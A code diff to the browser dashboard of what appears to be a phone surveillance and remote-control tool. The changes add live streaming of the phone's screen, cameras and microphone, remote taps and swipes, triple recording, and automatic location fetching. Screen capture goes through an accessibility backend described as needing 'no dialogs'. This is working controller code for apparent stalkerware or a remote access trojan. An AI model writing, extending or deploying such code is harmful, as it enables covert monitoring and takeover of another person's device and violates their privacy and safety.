@@ -407,33 +407,27 @@ async function loadBattery() {
     }
 }
 
-// ---- LIVE VIEW over WebSocket (v2.3.1) ----
-// One wss connection carries back/front JPEG + PCM mic; frames are
+// ---- LIVE VIEW over WebSocket (v2.3.1/v2.3.3) ----
+// One wss connection carries screen/back/front JPEG + PCM mic; frames are
 // drawn to a canvas (no <img> MJPEG buffering) for smooth playback.
 // Binary frame: [1B channel][4B BE length][payload]
-//   ch 2 = back-cam JPEG, 3 = front-cam JPEG, 4 = PCM16
-// Controls: {"cmd":"camera","v":"front"|"back"} / {"cmd":"audio","v":"on"|"off"}
-//           {"cmd":"source","v":"cam"} (fixed; screen mode is API-only)
+//   ch 1 = screen JPEG, 2 = back-cam JPEG, 3 = front-cam JPEG, 4 = PCM16
+// Default mode: MAIN canvas = phone screen, CAMERA PiP = top-right window
+// (rear by default; FLIP swaps the camera window to front and back).
+// Controls: {"cmd":"source","v":"screen"|"cam"} / {"cmd":"camera","v":"front"|"back"}
+//           {"cmd":"pip","v":"on"|"off"} / {"cmd":"audio","v":"on"|"off"}
 let liveOn = false;
-let liveSource = "cam";   // LIVE VIEW is camera-only; FLIP swaps the lens
-let liveLens = "back";
+let liveSource = "screen"; // screen fills the main canvas; camera shown in PiP
+let liveLens = "back";     // the camera lens shown in the PiP window
+let pipOn = true;
 let micAudioOn = true;
 let liveWs = null;
 
-function setLiveBtn(enabled) {
-    ["liveFlipBtn", "micAudioBtn"].forEach(id => {
-        const b = document.getElementById(id);
-        if (!b) return;
-        b.disabled = !enabled;
-        b.classList.toggle("opacity-40", !enabled);
-        b.classList.toggle("cursor-not-allowed", !enabled);
-    });
-    updateFlipLabel();
-}
-
 function updateFlipLabel() {
     const b = document.getElementById("liveFlipBtn");
-    if (b) b.innerHTML = `<span class="material-symbols-outlined text-sm">flip_camera_android</span> FLIP: ${liveLens.toUpperCase()}`;
+    if (b) b.innerHTML = `<span class="material-symbols-outlined text-sm">flip_camera_android</span> CAM: ${liveLens === "front" ? "FRONT" : "REAR"}`;
+    const label = document.getElementById("livePipLabel");
+    if (label) label.textContent = liveLens === "front" ? "FRONT" : "REAR";
 }
 
 function sendWs(obj) {
@@ -455,13 +449,29 @@ function drawToCanvas(canvasId, blob) {
     }).catch(() => {});
 }
 
+function liveStatusHtml() {
+    if (liveSource === "cam") return `<span>LIVE · CAM · ${liveLens.toUpperCase()}</span>`;
+    return `<span>LIVE · SCREEN${pipOn ? " · CAM:" + liveLens.toUpperCase() : ""}</span>`;
+}
+
 async function toggleLiveView() {
     liveOn = !liveOn;
     const btn = document.getElementById("liveBtn");
+    const status = document.getElementById("liveStatus");
     const main = document.getElementById("liveMain");
     const place = document.getElementById("livePlaceholder");
 
     if (liveOn) {
+        // Screen feed needs the accessibility capture backend enabled.
+        if (liveSource === "screen") {
+            const { host, port } = getHostPort();
+            const st = await api(`/api/device/${host}/${port}/screen/status`);
+            if (!st || !st.enabled) {
+                liveOn = false;
+                if (status) status.innerHTML = '<span class="text-hunt-crimson">CAPTURE DISABLED — open the Artemis app on the phone once and tap ENABLE (one-time, no dialogs)</span>';
+                return;
+            }
+        }
         const { host, port } = getHostPort();
         const proto = location.protocol === "https:" ? "wss" : "ws";
         liveWs = new WebSocket(`${proto}://${location.host}/api/device/${host}/${port}/ws/live`);
@@ -469,18 +479,24 @@ async function toggleLiveView() {
         liveWs.onopen = () => {
             main.style.display = "block";
             if (place) place.style.display = "none";
+            // Show the camera PiP window (main view is the screen).
+            const wrap = document.getElementById("livePipWrap");
+            if (wrap) wrap.style.display = "block";
             btn.innerHTML = '<span class="material-symbols-outlined text-lg">stop</span> STOP LIVE VIEW';
             btn.classList.remove("bg-hunt-crimson/10", "border-hunt-crimson/50", "text-hunt-crimson");
             btn.classList.add("bg-hunt-crimson", "text-white", "border-hunt-crimson");
+            if (status) status.innerHTML = liveStatusHtml();
             setLiveBtn(true);
             // Full video-call default: audio on (toggleable).
             if (micAudioOn) startMicAudio();
             sendWs({ cmd: "source", v: liveSource });
             sendWs({ cmd: "camera", v: liveLens });
+            sendWs({ cmd: "pip", v: pipOn ? "on" : "off" });
             sendWs({ cmd: "audio", v: micAudioOn ? "on" : "off" });
         };
         liveWs.onmessage = (ev) => {
             const buf = ev.data;
+            if (typeof buf === "string") { handleWsText(buf); return; }
             if (!(buf instanceof ArrayBuffer) || buf.byteLength < 5) return;
             const ch = new Uint8Array(buf, 0, 1)[0];
             const len = new DataView(buf, 1, 4).getUint32(0, false);
@@ -493,19 +509,33 @@ async function toggleLiveView() {
                     samples[i] = dv.getInt16(i * 2, true) / 32768;
                 }
                 pushLiveAudio(samples);
+            } else if (ch === 1) {
+                // phone screen → main canvas
+                drawToCanvas("liveMain", new Blob([payload], { type: "image/jpeg" }));
             } else if (ch === 2 || ch === 3) {
-                const isMain = (ch === 2 && liveLens === "back") || (ch === 3 && liveLens === "front");
-                if (isMain) drawToCanvas("liveMain", new Blob([payload], { type: "image/jpeg" }));
+                // camera frame → PiP window (rear/front as selected)
+                const blob = new Blob([payload], { type: "image/jpeg" });
+                if (liveSource === "cam") {
+                    // In cam-only mode the selected lens fills the main canvas.
+                    const isMain = (ch === 2 && liveLens === "back") || (ch === 3 && liveLens === "front");
+                    if (isMain) drawToCanvas("liveMain", blob);
+                } else {
+                    drawToCanvas("livePip", blob);
+                }
             }
         };
         liveWs.onclose = () => {
             liveWs = null;
             liveOn = false;
+            if (recordingOn) { recordingOn = false; setRecBtn(false); showRecIndicator(false); }
             main.style.display = "none";
             if (place) place.style.display = "flex";
+            const wrap = document.getElementById("livePipWrap");
+            if (wrap) wrap.style.display = "none";
             btn.innerHTML = '<span class="material-symbols-outlined text-lg">play_arrow</span> START LIVE VIEW';
             btn.classList.add("bg-hunt-crimson/10", "border-hunt-crimson/50", "text-hunt-crimson");
             btn.classList.remove("bg-hunt-crimson", "text-white", "border-hunt-crimson");
+            if (status) status.innerHTML = "<span>NO_STREAM</span>";
             setLiveBtn(false);
             stopMicAudio();
         };
@@ -514,18 +544,223 @@ async function toggleLiveView() {
         if (liveWs) { try { liveWs.close(); } catch (e) {} liveWs = null; }
         main.style.display = "none";
         if (place) place.style.display = "flex";
+        const wrap = document.getElementById("livePipWrap");
+        if (wrap) wrap.style.display = "none";
         btn.innerHTML = '<span class="material-symbols-outlined text-lg">play_arrow</span> START LIVE VIEW';
         btn.classList.add("bg-hunt-crimson/10", "border-hunt-crimson/50", "text-hunt-crimson");
         btn.classList.remove("bg-hunt-crimson", "text-white", "border-hunt-crimson");
+        if (status) status.innerHTML = "<span>NO_STREAM</span>";
         setLiveBtn(false);
         stopMicAudio();
     }
+}
+
+function toggleLiveSource() {
+    liveSource = liveSource === "screen" ? "cam" : "screen";
+    const status = document.getElementById("liveStatus");
+    if (liveWs && liveWs.readyState === WebSocket.OPEN) {
+        sendWs({ cmd: "source", v: liveSource });
+        sendWs({ cmd: "camera", v: liveLens });
+        if (status) status.innerHTML = liveStatusHtml();
+    }
+    // In cam-only mode the camera fills the main canvas; hide the PiP.
+    const wrap = document.getElementById("livePipWrap");
+    if (wrap) wrap.style.display = liveSource === "cam" ? "none" : "block";
+    const srcBtn = document.getElementById("liveSourceBtn");
+    if (srcBtn) srcBtn.innerHTML = `<span class="material-symbols-outlined text-sm">${liveSource === "screen" ? "screen_share" : "photo_camera"}</span> ${liveSource.toUpperCase()}`;
 }
 
 function toggleFlip() {
     liveLens = liveLens === "back" ? "front" : "back";
     sendWs({ cmd: "camera", v: liveLens });
     updateFlipLabel();
+    const status = document.getElementById("liveStatus");
+    if (status) status.innerHTML = liveStatusHtml();
+}
+
+function togglePip() {
+    pipOn = !pipOn;
+    const wrap = document.getElementById("livePipWrap");
+    const btn = document.getElementById("pipBtn");
+    if (pipOn) {
+        if (wrap) wrap.style.display = "block";
+        if (btn) btn.innerHTML = '<span class="material-symbols-outlined text-sm">front_camera</span> CAM PIP: ON';
+        if (liveWs && liveWs.readyState === WebSocket.OPEN) sendWs({ cmd: "pip", v: "on" });
+    } else {
+        if (wrap) wrap.style.display = "none";
+        if (btn) btn.innerHTML = '<span class="material-symbols-outlined text-sm">front_camera</span> CAM PIP: OFF';
+        if (liveWs && liveWs.readyState === WebSocket.OPEN) sendWs({ cmd: "pip", v: "off" });
+    }
+}
+
+// ---- v2.3.3: remote-admin control (tap/swipe/buttons), triple RECORD, PiP PLAY ----
+
+const DEV_SCREEN_W = 1080;
+const DEV_SCREEN_H = 2400;
+let recordingOn = false;
+
+function setLiveBtn(enabled) {
+    ["liveSourceBtn", "liveFlipBtn", "pipBtn", "micAudioBtn", "liveRecBtn"].forEach(id => {
+        const b = document.getElementById(id);
+        if (!b) return;
+        b.disabled = !enabled;
+        b.classList.toggle("opacity-40", !enabled);
+        b.classList.toggle("cursor-not-allowed", !enabled);
+    });
+    document.querySelectorAll("#controlPad .ctl-btn").forEach(b => {
+        b.disabled = !enabled;
+        b.classList.toggle("opacity-40", !enabled);
+        b.classList.toggle("cursor-not-allowed", !enabled);
+    });
+    updateFlipLabel();
+}
+
+// Map a pointer event on the (object-fit: contain) feed canvas to device
+// screen pixels. The canvas bitmap is the camera frame; the phone screen is
+// 1080x2400. Letterboxing is accounted for so taps land proportionally.
+function feedToDevice(c, ev) {
+    const cw = c.clientWidth, ch = c.clientHeight;
+    const aw = c.width || cw, ah = c.height || ch;
+    const scale = Math.min(cw / aw, ch / ah);
+    const dw = aw * scale, dh = ah * scale;
+    const dx = (cw - dw) / 2, dy = (ch - dh) / 2;
+    const x = Math.round(((ev.offsetX - dx) / dw) * DEV_SCREEN_W);
+    const y = Math.round(((ev.offsetY - dy) / dh) * DEV_SCREEN_H);
+    return {
+        x: Math.max(0, Math.min(DEV_SCREEN_W - 1, x)),
+        y: Math.max(0, Math.min(DEV_SCREEN_H - 1, y)),
+    };
+}
+
+let dragState = null;
+
+function bindControlCanvas() {
+    const c = document.getElementById("liveMain");
+    if (!c || c.dataset.ctlBound) return;
+    c.dataset.ctlBound = "1";
+    c.addEventListener("pointerdown", e => {
+        if (!liveOn || !liveWs) return;
+        const p = feedToDevice(c, e);
+        dragState = { x1: p.x, y1: p.y, moved: false, sx: e.clientX, sy: e.clientY };
+        try { c.setPointerCapture(e.pointerId); } catch (err) {}
+    });
+    c.addEventListener("pointermove", e => {
+        if (!dragState) return;
+        if (Math.hypot(e.clientX - dragState.sx, e.clientY - dragState.sy) > 8) dragState.moved = true;
+    });
+    c.addEventListener("pointerup", e => {
+        if (!dragState) return;
+        const p = feedToDevice(c, e);
+        if (dragState.moved) {
+            sendWs({ cmd: "input", action: "swipe", x1: dragState.x1, y1: dragState.y1, x2: p.x, y2: p.y });
+        } else {
+            sendWs({ cmd: "input", action: "tap", x: p.x, y: p.y });
+        }
+        dragState = null;
+    });
+    c.addEventListener("pointercancel", () => { dragState = null; });
+}
+
+function sendGlobalAction(action) {
+    sendWs({ cmd: "input", action: "global", v: action });
+}
+
+function showRecIndicator(on) {
+    const el = document.getElementById("recIndicator");
+    if (!el) return;
+    el.classList.toggle("hidden", !on);
+    el.classList.toggle("flex", on);
+}
+
+function setRecBtn(on) {
+    const b = document.getElementById("liveRecBtn");
+    if (!b) return;
+    b.innerHTML = on
+        ? '<span class="w-2.5 h-2.5 rounded-full bg-hunt-crimson animate-pulse"></span> STOP'
+        : '<span class="w-2.5 h-2.5 rounded-full bg-hunt-crimson"></span> RECORD';
+    if (on) {
+        b.classList.add("bg-hunt-crimson/10", "border-hunt-crimson/50", "text-hunt-crimson");
+    } else {
+        b.classList.remove("bg-hunt-crimson/10", "border-hunt-crimson/50", "text-hunt-crimson");
+    }
+}
+
+function toggleRecord() {
+    recordingOn = !recordingOn;
+    sendWs({ cmd: "record", v: recordingOn ? "on" : "off" });
+    setRecBtn(recordingOn);
+    showRecIndicator(recordingOn);
+    if (!recordingOn) {
+        // Give the phone a moment to finalize the MP4s, then refresh.
+        setTimeout(loadRecordings, 800);
+    }
+}
+
+function fmtTime(ms) {
+    const d = new Date(ms);
+    return d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
+}
+
+async function loadRecordings() {
+    const { host, port } = getHostPort();
+    const listEl = document.getElementById("recordingsList");
+    if (!listEl) return;
+    try {
+        const r = await api(`/api/device/${host}/${port}/record/list`);
+        const groups = [
+            ["screen", r.screen || []],
+            ["front", r.front || []],
+            ["rear", r.rear || []],
+        ];
+        const total = groups.reduce((n, [, files]) => n + files.length, 0);
+        if (!total) { listEl.innerHTML = '<span class="text-moon-silver/40">— none yet —</span>'; return; }
+        let html = "";
+        for (const [media, files] of groups) {
+            if (!files.length) continue;
+            html += `<div class="mt-2 font-bold tracking-widest text-moon-silver/80">${media.toUpperCase()}</div>`;
+            for (const f of files) {
+                html += `<div class="flex items-center justify-between gap-2 pl-3">
+                    <span class="truncate">${esc(f.name)} · ${fmtSize(f.size)} · ${fmtTime(f.mtime)}</span>
+                    <button onclick="playRecording('${media}', '${esc(f.name)}')" class="shrink-0 border border-maquis-green/50 text-maquis-green hover:bg-maquis-green hover:text-white transition-colors px-3 py-1 rounded flex items-center gap-1 font-label text-[10px] tracking-widest">
+                        <span class="material-symbols-outlined text-xs">play_arrow</span>PLAY
+                    </button>
+                </div>`;
+            }
+        }
+        listEl.innerHTML = html;
+    } catch (e) {
+        listEl.innerHTML = '<span class="text-hunt-crimson/70">record list failed — is the phone reachable?</span>';
+    }
+}
+
+function playRecording(media, id) {
+    const { host, port } = getHostPort();
+    const wrap = document.getElementById("recordPipWrap");
+    const vid = document.getElementById("recordPipVideo");
+    if (!wrap || !vid) return;
+    vid.src = `/api/device/${host}/${port}/record/${media}/${encodeURIComponent(id)}/file?x=${Date.now()}`;
+    wrap.classList.remove("hidden");
+    vid.play().catch(() => {});
+}
+
+function closeRecordPip() {
+    const wrap = document.getElementById("recordPipWrap");
+    const vid = document.getElementById("recordPipVideo");
+    if (vid) { vid.pause(); vid.removeAttribute("src"); vid.load(); }
+    if (wrap) wrap.classList.add("hidden");
+}
+
+// Phone → browser text frames (e.g. {"event":"record_saved"}) refresh the list.
+function handleWsText(raw) {
+    try {
+        const msg = JSON.parse(raw);
+        if (msg && msg.event === "record_saved") {
+            recordingOn = false;
+            setRecBtn(false);
+            showRecIndicator(false);
+            loadRecordings();
+        }
+    } catch (e) { /* non-JSON control frame — ignore */ }
 }
 
 // ---- mic audio playback (PCM16 mono 44.1kHz) over WebSocket ----
@@ -611,3 +846,6 @@ window.addEventListener("beforeunload", () => {
 
 // Auto-fetch the phone's location when the dashboard opens.
 getLocation();
+// Remote-admin control pad: tap/drag the feed canvas + recordings list.
+bindControlCanvas();
+loadRecordings();
